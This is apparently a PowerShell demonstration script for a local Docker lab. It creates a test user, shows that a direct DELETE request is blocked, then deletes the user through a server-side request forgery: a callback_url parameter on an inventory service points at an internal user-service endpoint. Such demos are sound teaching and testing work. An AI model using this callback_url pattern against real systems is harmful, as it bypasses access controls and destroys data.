# SSRF Demo Script
# Run this script to demonstrate SSRF vulnerability

Write-Host "========== SSRF VULNERABILITY DEMO ==========
" -ForegroundColor Cyan

# Create test user
Write-Host "1 Creating test user..." -ForegroundColor Yellow
docker-compose exec -T postgres-user psql -U postgres -d userdb -c "INSERT INTO users (username, email, password, role) VALUES ('victim', 'victim@test.com', 'pass123', 'USER') ON CONFLICT DO NOTHING RETURNING id;"

Write-Host "
2 TEST: Browser/Postman DELETE (should be BLOCKED)..." -ForegroundColor Yellow
try {
    Invoke-RestMethod -Uri "http://localhost:8081/api/users/delete/6" -Method DELETE
    Write-Host " FAILED: Browser can delete user!" -ForegroundColor Red
} catch {
    Write-Host " BLOCKED: $($_.ErrorDetails.Message)" -ForegroundColor Green
}

Write-Host "
3 TEST: SSRF Attack from Service 8083 (should SUCCESS)..." -ForegroundColor Yellow
Invoke-RestMethod -Uri "http://localhost:8083/api/inventory/1/M?callback_url=http://user-service:8081/api/users/delete/6" | Out-Null
Start-Sleep -Seconds 1

try {
    Invoke-RestMethod -Uri "http://localhost:8081/api/users/6" | Out-Null
    Write-Host " FAILED: SSRF didn't work!" -ForegroundColor Red
} catch {
    Write-Host " SUCCESS: SSRF deleted user!" -ForegroundColor Green
}

Write-Host "
4 Service logs:" -ForegroundColor Yellow
docker-compose logs user-service 2>&1 | Select-String -Pattern "(Delete request|ALLOWED|BLOCKED)" | Select-Object -Last 4

Write-Host "
========== DEMO COMPLETE ==========
" -ForegroundColor Cyan
